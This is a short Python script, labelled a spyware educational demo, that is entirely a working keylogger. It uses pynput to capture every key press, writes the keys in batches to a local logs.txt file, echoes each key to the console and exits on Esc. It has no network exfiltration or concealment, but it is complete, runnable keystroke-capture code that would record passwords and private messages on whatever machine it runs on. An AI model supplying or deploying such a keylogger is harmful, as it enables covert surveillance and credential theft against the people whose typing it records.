"""
SPYWARE EDUCATIONAL DEMO
Ashutosh Behera
FOR AUTHORIZED, LEGAL, EDUCATIONAL USE ONLY
"""

from pynput import keyboard
import datetime

log_file = "logs.txt"

# record buffer
log_buffer = []

# write to file safely
def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k + " ")
        f.write("\n")

# handle on_press
def on_press(key):
    log_buffer.append(key)
    # optional: flush on every 10 keys
    if len(log_buffer) >= 10:
        write_file(log_buffer)
        log_buffer.clear()
    print(f"Key pressed: {key}")

# handle on_release
def on_release(key):
    if key == keyboard.Key.esc:
        # flush any leftover buffer
        if log_buffer:
            write_file(log_buffer)
        print("Exiting keylogger.")
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

